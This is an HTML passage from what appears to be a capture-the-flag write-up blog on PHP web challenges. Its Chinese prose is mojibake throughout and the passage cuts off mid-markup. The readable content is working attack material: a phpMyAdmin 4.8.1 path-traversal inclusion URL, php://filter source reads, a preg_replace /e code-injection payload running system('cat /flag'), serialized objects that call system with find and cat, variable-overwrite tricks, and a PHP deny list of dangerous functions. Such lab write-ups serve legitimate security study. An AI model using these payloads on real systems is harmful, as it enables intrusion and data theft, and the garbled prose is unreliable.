2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h2><p>æ€€ç–‘æ˜¯ç¯å¢ƒé—®é¢˜ï¼Œæˆ‘çœ‹åˆ°ç¯å¢ƒå°±é©¬ä¸Šå»æ‰¾wpäº†</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201121818740.png" alt="image-20220112181811674"></p><p>å‘ç°æœ‰ /phpmyadmin/</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201121819546.png" alt="image-20220112181916453"></p><p>é”å®šphpç‰ˆæœ¬ä¸º4.8.1,ç™¾åº¦å‘ç°PHP4.8.1æœ‰æ–‡ä»¶åŒ…å«æ¼æ´</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">phpmyadmin<span class="hljs-regexp">/?target=db_datadict.php%253f/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>flag<br></code></pre></td></tr></table></figure><h2 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h2><p> [ZJCTF 2019]NiZhuanSiWei çš„pro</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://c<span class="hljs-number">5002517</span>-<span class="hljs-number">0</span>e<span class="hljs-number">11</span>-<span class="hljs-number">4374</span>-<span class="hljs-number">8</span>fba-<span class="hljs-number">0</span>ee<span class="hljs-number">811705</span>b<span class="hljs-number">37</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/?text=data://text/plain;base<span class="hljs-number">64</span>,SSBoYXZlIGEgZHJlYW<span class="hljs-number">0</span>=&amp;file=php://filter/read=convert.base<span class="hljs-number">64</span>-encode/resource=next.php<br></code></pre></td></tr></table></figure><p>å¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> preg_replace(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> complex(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br><br></code></pre></td></tr></table></figure><div class="code-wrapper"><pre><code class="hljs">è¿™é¢˜è¿˜çœŸä¸å°‘ä¸œè¥¿å…ˆè¯´è¯´è¿™ä¸ªcomplex å‡½æ•°çš„è¿”å›å€¼</code></pre></div><blockquote><p><strong>åå‘å¼•ç”¨</strong></p><p>å¯¹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æˆ–éƒ¨åˆ†æ¨¡å¼ <strong>ä¸¤è¾¹æ·»åŠ åœ†æ‹¬å·</strong> å°†å¯¼è‡´ç›¸å…³ <strong>åŒ¹é…å­˜å‚¨åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒº</strong> ä¸­ï¼Œæ‰€æ•è·çš„æ¯ä¸ªå­åŒ¹é…éƒ½æŒ‰ç…§åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä»å·¦åˆ°å³å‡ºç°çš„é¡ºåºå­˜å‚¨ã€‚ç¼“å†²åŒºç¼–å·ä» 1 å¼€å§‹ï¼Œæœ€å¤šå¯å­˜å‚¨ 99 ä¸ªæ•è·çš„å­è¡¨è¾¾å¼ã€‚æ¯ä¸ªç¼“å†²åŒºéƒ½å¯ä»¥ä½¿ç”¨ â€˜\nâ€™ è®¿é—®ï¼Œå…¶ä¸­ n ä¸ºä¸€ä¸ªæ ‡è¯†ç‰¹å®šç¼“å†²åŒºçš„ä¸€ä½æˆ–ä¸¤ä½åè¿›åˆ¶æ•°ã€‚</p></blockquote><div class="code-wrapper"><pre><code class="hljs">æ‰€ä»¥è¿™ä¸ªåœ°æ–¹ å®é™…ç”¨äºæ›¿æ¢çš„å­—ç¬¦ä¸²æ˜¯ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹è¿™ä¸ªæ—¶å€™ å¦‚æœæˆ‘ä»¬ä¼ å…¥ ` ?.*=$&#123;phpinfo()&#125;` å°±ç›¸å½“äº `preg_replace(/(.*)/ie,strtolower(&quot;\\1&quot;),$str)` å°±ç›¸å½“äºè¿”å›è‡ªå·±æœ¬èº«äº†ï¼Œç„¶è€Œæˆ‘ä»¬çŸ¥é“PHPå­—ç¬¦ä¸²æœ‰è‡ªå·±è§£æç‰¹æ€§ å³ . =&gt; _ è¿™é‡Œå¤§ä½¬ç»™å‡ºäº†ç­”æ¡ˆ æ›¿æ¢ä¸º `?S*=$&#123;phpinfo()&#125;` è¯´å®è¯æˆ‘ä¸æ˜¯å¾ˆæ˜ç™½ç»“åˆé¢˜æ„ï¼Œphpinfo =&gt; getFlag</code></pre></div><p>payload: <code>/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(%27cat%20/flag%27);</code></p><h2 id="å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢"><a href="#å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢"></a>[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</h2><p><a href="https://blog.csdn.net/a3320315/article/details/102945940">https://blog.csdn.net/a3320315/article/details/102945940</a></p><p>å¤§ä½¬çš„åšå®¢</p><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h2><p>ä¸€å¼€å§‹æ˜¯å°è¯•çœ‹htmlæºç æ²¡å•¥æ€è·¯ï¼Œè¿™ä¸œè¥¿ä½¿åŠ²çš„åˆ·æ–°ç„¶åæˆ‘ä¹Ÿçƒ¦ï¼Œä¸Šäº†ä¸ªburp</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201131435706.png" alt="image-20220113143537558"></p><p>æŠ“ä¸ªåŒ…  çœ‹è¿™ä¸ªfunc å’Œ pçš„å…³ç³»ï¼Œåƒä¸åƒæ˜¯ func(p) ï¼Œé¡ºç€è¿™ä¸ªæ€è·¯å¾€ä¸‹</p><p>æˆ‘ä¸€å¼€å§‹å°è¯•äº† <code>highlight_file(__FILE__)</code> ç„¶è€Œå¹¶æ²¡æœ‰æˆåŠŸï¼Œä¾æ®æŠ¥é”™ä¿¡æ¯ index.php</p><p>æˆ‘æ„å»ºäº† <code>func=highlight_file&amp;p=index.php</code>ï¼Œå°±è¯»åˆ°æºç äº†ï¼Œå¯èƒ½æ˜¯è¿™ä¸ªé¢˜ä¸è®©ç”¨ <code>__FILE__ </code>å§</p><p>å’³ï¼Œå®æµ‹readFileè¿™é‡Œæ›´å¥½ä½¿ï¼Œå¯ä»¥ç›´æ¥å¤åˆ¶æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>        <span class="hljs-variable">$result</span> = call_user_func(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>        <span class="hljs-variable">$a</span>= gettype(<span class="hljs-variable">$result</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                <span class="hljs-keyword">echo</span> gettime(<span class="hljs-keyword">$this</span>-&gt;func, <span class="hljs-keyword">$this</span>-&gt;p);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<br>    <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-variable">$func</span> = strtolower(<span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> gettime(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><div class="code-wrapper"><pre><code class="hljs">Func(p) è¿˜å¯ä»¥æ‹“å±•æˆ system(command) è¿™é‡Œæ²¡æœ‰ç¦ç”¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥è®©ä¸€ä¸ªå¯ä»¥çœ‹flagçš„å¯¹è±¡åºåˆ—åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œæœ€åå†é‡Šæ”¾å‡ºæ¥ã€‚åºåˆ—åŒ–çš„å­—ç¬¦ä¸²gettypeå¤„ç†åæ˜¯Stringç±»å‹ã€‚</code></pre></div><p>äºæ˜¯æœ‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br>     <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;find / -name flag*&quot;</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;system&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Test();<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A18%3A%22find+%2F+-name+flag%2A%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œè¿™ä¼šèŠ±è´¹ä¸€äº›æ—¶é—´ï¼Œæ¯•ç«Ÿæ˜¯æ ¹ç›®å½•å¼€å§‹ä¸€æ­¥æ­¥æ‰¾ é”å®šä½ç½® <code>/tmp/flagoefiu4r93</code></p><p>ç„¶åæœ‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br>     <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;cat /tmp/flagoefiu4r93&quot;</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;system&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Test();<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A22%3A%22cat+%2Ftmp%2Fflagoefiu4r93%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7Dunserialize</span><br></code></pre></td></tr></table></figure><p>æ„é€ </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br>. . .<br><br><span class="apache"><span class="hljs-attribute">func</span>=unserialize&amp;p=O%<span class="hljs-number">3</span>A<span class="hljs-number">4</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Test%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">2</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>p%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>cat+%<span class="hljs-number">2</span>Ftmp%<span class="hljs-number">2</span>Fflagoefiu<span class="hljs-number">4</span>r<span class="hljs-number">93</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">4</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>func%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>system%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Dunserialize</span><br></code></pre></td></tr></table></figure><p>å°±å¯ä»¥getFlagäº†</p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>å•¥ä¹Ÿæ²¡æœ‰ï¼ŒçŒœæœ‰gitæ³„éœ²ã€‚çœŸçš„æœ‰ï¼Œç„¶è€Œæˆ‘å¹¶æ²¡æœ‰è·å¾—æºç åªæ˜¯è·å¾—äº†ä¸€äº›æ²¡å•¥ç”¨çš„èµ„æºæ–‡ä»¶</p><p>å»ç½‘ä¸Šå«–åˆ«äººçš„ä»£ç äº†ğŸ¤·â€â™‚ï¸</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-variable">$yds</span> = <span class="hljs-string">&quot;dog&quot;</span>;<br><span class="hljs-variable">$is</span> = <span class="hljs-string">&quot;cat&quot;</span>;<br><span class="hljs-variable">$handsome</span> = <span class="hljs-string">&#x27;yds&#x27;</span>;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$y</span>;<br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$$y</span>;<br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>);<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;the flag is: &quot;</span>.<span class="hljs-variable">$flag</span>;<br></code></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = file_get_contents(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p>æœŸå¾…ç¨‹åºç¨‹åºæ‰§è¡Œåˆ° 31è¡Œ</p><p>æˆ‘ä»¬éœ€è¦æ»¡è¶³</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>...<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))<br>...    <br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)<br></code></pre></td></tr></table></figure><p>è‡ªå·±å˜é‡è¦†ç›–è¿™å—å­¦çš„ä¸å¤ªå¥½ï¼Œäºæ˜¯çœ‹äº†çœ‹å…¶ä»–å¸ˆå‚…çš„wp</p><h3 id="è§£æ³•1"><a href="#è§£æ³•1" class="headerlink" title="è§£æ³•1"></a>è§£æ³•1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$$y</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªåœ°æ–¹ $$x,$$y å…¨éƒ¨å¯æ§ï¼Œdemo <code>x=$yds,y=$flag</code> =&gt; <code>$yds=$flag</code></p><p>æœ‰ <code>GET: $yds=$flag</code></p><h3 id="è§£æ³•2"><a href="#è§£æ³•2" class="headerlink" title="è§£æ³•2"></a>è§£æ³•2</h3><p>è¿™ä¸ªåœ°æ–¹å¸ˆå‚…ç‚¹é†’äº†æˆ‘ exit ä¹Ÿæ˜¯ä¸€ç§è¾“å‡ºæ›´ä½•å†µ exitçš„å‚æ•°æ˜¯ä¸€ä¸ªå˜é‡</p><p><a href="%E5%B8%88%E5%82%85%E5%8D%9A%E5%AE%A2">https://blog.csdn.net/qq_43622442/article/details/105925473</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$$y</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>GET:is=flag&amp;flag=flag</code></p><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>æ‰“å¼€ä¹‹ååªèƒ½æŸ¥çœ‹çŒ«æˆ–ç‹—çš„å›¾ç‰‡ï¼Œæ²¡æœ‰ä¿¡æ¯æ³„éœ²</p><p>å°è¯•æ–‡ä»¶åŒ…å«</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">index.php?category=php://filter/convert.base64-encode/resource=index.php<br></code></pre></td></tr></table></figure><p>æ²¡æœ‰æˆåŠŸï¼Œä¸è¿‡æŠŠåç¼€å»æ‰å°±å¥½äº†ï¼Œè¯´æ˜è¿™ä¸ªåœ°æ–¹å¯¹åç¼€åšäº†æ‰‹è„šï¼Œä¹‹ååšé¢˜å¯ä»¥åªä¼ indexçœ‹è¿”å›ç»“æœ</p><p>base64è§£ç åçš„ç»“æœ(æ‰”æ‰html)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;category&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))<br>&#123;<br><span class="hljs-keyword">if</span>( strpos( <span class="hljs-variable">$file</span>, <span 